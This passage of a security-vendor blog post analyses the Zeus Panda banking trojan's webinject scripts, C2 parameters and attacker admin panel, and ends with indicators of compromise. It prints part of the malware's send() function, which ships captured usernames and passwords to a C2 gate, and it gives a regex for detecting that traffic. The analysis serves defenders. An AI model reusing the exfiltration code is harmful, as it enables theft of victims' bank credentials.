<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">send</span><span class="p">:</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
<span class="err">Â </span> <span class="err">Â </span> <span class="kd">var</span> <span class="nx">l</span> <span class="o">=</span> <span class="nx">link</span><span class="p">.</span><span class="nx">gate</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">?botid=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">_tables</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">_brows</span><span class="p">.</span><span class="nx">botid</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;hash=</span><span class="dl">'</span> <span class="o">+</span> <span class="k">new</span> <span class="nc">Date</span><span class="p">()</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;bname=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">_tables</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">bank</span><span class="dl">'</span><span class="p">);</span>
<span class="err">Â </span> <span class="err">Â </span> <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="k">for </span><span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">arguments</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span> <span class="p">{</span>
<span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="nx">l</span> <span class="o">+=</span> <span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">_tables</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">arguments</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="nx">key</span><span class="p">]);</span>
<span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="err">Â </span> <span class="p">}</span>
<span class="err">Â </span> <span class="err">Â </span> <span class="p">}</span>
<span class="c1">// ... further code ...</span>
</code></pre></div></div>

<p>This function simply sets all collected data as GET Parameters and sends a HTTPS request to a PHP backend, defined in the variable <em>link.gate</em>.Â Depending on the target website, we could observe different parameters and small differences in the construction of the parameter values. The following list gives an overview of identified parameters. This list is not complete and some of the parameters are optional. All parameters are send in plain text to the C2 backend.</p>

<figure>
  <table>
    <thead>
      <tr>
        <th style="text-align: left">Paramter name</th>
        <th style="text-align: left">Value</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="text-align: left">botid</td>
        <td style="text-align: left">Unique client identifier</td>
      </tr>
      <tr>
        <td style="text-align: left">bname</td>
        <td style="text-align: left">Target identifier</td>
      </tr>
      <tr>
        <td style="text-align: left">hash</td>
        <td style="text-align: left">Timestamp (new Date())</td>
      </tr>
      <tr>
        <td style="text-align: left">login1</td>
        <td style="text-align: left">user name</td>
      </tr>
      <tr>
        <td style="text-align: left">login2</td>
        <td style="text-align: left">user password</td>
      </tr>
      <tr>
        <td style="text-align: left">type</td>
        <td style="text-align: left">module type (grabber, ats, intercepts)</td>
      </tr>
      <tr>
        <td style="text-align: left">param1</td>
        <td style="text-align: left">start</td>
      </tr>
      <tr>
        <td style="text-align: left">domain</td>
        <td style="text-align: left">document.location</td>
      </tr>
      <tr>
        <td style="text-align: left">branch</td>
        <td style="text-align: left">Status to trigger different functionalities</td>
      </tr>
    </tbody>
  </table>

  <figcaption>Figure 1: Identified paramters</figcaption>
</figure>

<p>We intend to provide further details in a follow-up post. However, now we need to talk about the backend. Behold the Zeus Panda administration panel:## Admin Panel Details</p>

<p>The webinject code naturally led us to C2 servers and a closer analysis led us to an admin panel on one of the servers we investigated.</p>

<figure class="figure-posts" style="width: 100%; display:block; margin: auto; margin-bottom: 1em;">
  <div class="image-container" id="/images/posts/2017/02/overview_table1.png"> 
    <a href="#img/images/posts/2017/02/overview_table1.png">
      <img src="/images/posts/2017/02/overview_table1.png" alt="Screenshot of admin panel" class="img-responsive" />
      </a>
      <a href="#/images/posts/2017/02/overview_table1.png" class="lightbox" id="img/images/posts/2017/02/overview_table1.png">
        <span style="background-image: url(/images/posts/2017/02/overview_table1.png)"></span>
      </a>
      <figcaption class="figcaption-posts">Figure 4: Admin-Panel</figcaption>
    </div>
  </figure>

<p>Figure 4 displays the start screen of the Admin-Panel. Every infected machine is displayed in one row. For every entry the following information is listed:</p>

<ol>
  <li>BotId: Unique identifier for the compromised system</li>
  <li>The active module type</li>
  <li>Job status of the entry</li>
  <li>Login credentials (username/password)</li>
  <li>Account status</li>
  <li>Victim IP address</li>
  <li>Timestamp of infection</li>
  <li>Browser version</li>
  <li>Target URL (bank)</li>
</ol>

<p>The top navigation bar lists some available filters like format settings, drop zones and further configuration settings.</p>

<p>The panel is used by the attacker to see new victim machines and available actions. By clicking on the entries, the attacker can view detailed information aboutÂ the compromised user. For example, details like the account balance of the victim, the amount available for transfer and even the transaction limit can be displayed. Furthermore the attacker can attach notes to the specific victim, to keep track of his fraudulent actions.</p>

<figure class="figure-posts" style="width: 65%; display:block; margin: auto; margin-bottom: 1em;">
  <div class="image-container" id="/images/posts/2017/02/overwied_detailed_011.png"> 
    <a href="#img/images/posts/2017/02/overwied_detailed_011.png">
      <img src="/images/posts/2017/02/overwied_detailed_011.png" alt="Screenshot of admin panel detail view" class="img-responsive" />
      </a>
      <a href="#/images/posts/2017/02/overwied_detailed_011.png" class="lightbox" id="img/images/posts/2017/02/overwied_detailed_011.png">
        <span style="background-image: url(/images/posts/2017/02/overwied_detailed_011.png)"></span>
      </a>
      <figcaption class="figcaption-posts">Figure 5: Admin-Panel detail view</figcaption>
    </div>
  </figure>

<h2 id="conclusion">Conclusion</h2>

<p>Banking Trojans are still one of the most valuable sources of income for criminals online. Given the fact that this kind of malware has beenÂ developed and optimized for many years, itâs not surprising that we can observe rather a high code quality. With the Admin-Panel, the attacker has a way to manage the compromised machines without the need to knowÂ  technical infection details, making this kind of revenue stream accessible also to the technically rather illiterate.</p>

<p>In the follow-up blog post, we will take a closer look into target specific webinject scripts.</p>

<h2 id="indicators-of-compromise">Indicators of compromise</h2>

<figure>

  <table>
    <thead>
      <tr>
        <th style="text-align: left">Script-Stage</th>
        <th style="text-align: left">IoC</th>
        <th style="text-align: left">Functionality</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="text-align: left">1st stage</td>
        <td style="text-align: left">SHA256: d8444c2c23e7469a518b303763edfe5fd38f9ffd11d42bfdba2663b9caf3de06</td>
        <td style="text-align: left">Loader</td>
      </tr>
      <tr>
        <td style="text-align: left">1st stage  <br /> initial webinject</td>
        <td style="text-align: left"><code class="language-plaintext highlighter-rouge">_brows.botid</code> <br /> <code class="language-plaintext highlighter-rouge">_brows.inject</code></td>
        <td style="text-align: left">Loader</td>
      </tr>
      <tr>
        <td style="text-align: left">2nd stage</td>
        <td style="text-align: left">SHA256: a99e2d6ec2a1c5b5e59c544302aa61266bb0b7d0d76f4ebed17a3906f94c2794</td>
        <td style="text-align: left">Exfiltration</td>
      </tr>
      <tr>
        <td style="text-align: left">2nd stage <br /> target specific</td>
        <td style="text-align: left"><code class="language-plaintext highlighter-rouge">\.php\?(&amp;?(botid|hash|bname|login1|login2|type|param1|domain|branch)=[^&amp;]*){4,9}$</code></td>
        <td style="text-align: left">Exfiltration</td>
      </tr>
    </tbody>
  </table>

  <figcaption>Figure 2: IoC-Table</figcaption>
</figure>

  </article>

  

</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      <a href="https://www.gdata.de/business">G DATA Advanced Analytics</a>
      |
      <a href="/imprint">Imprint</a>
      |
      <a href="/privacy-policy">Privacy Policy</a>
    </footer>
  </div>
</div>


      </div>
    </body>
</html>
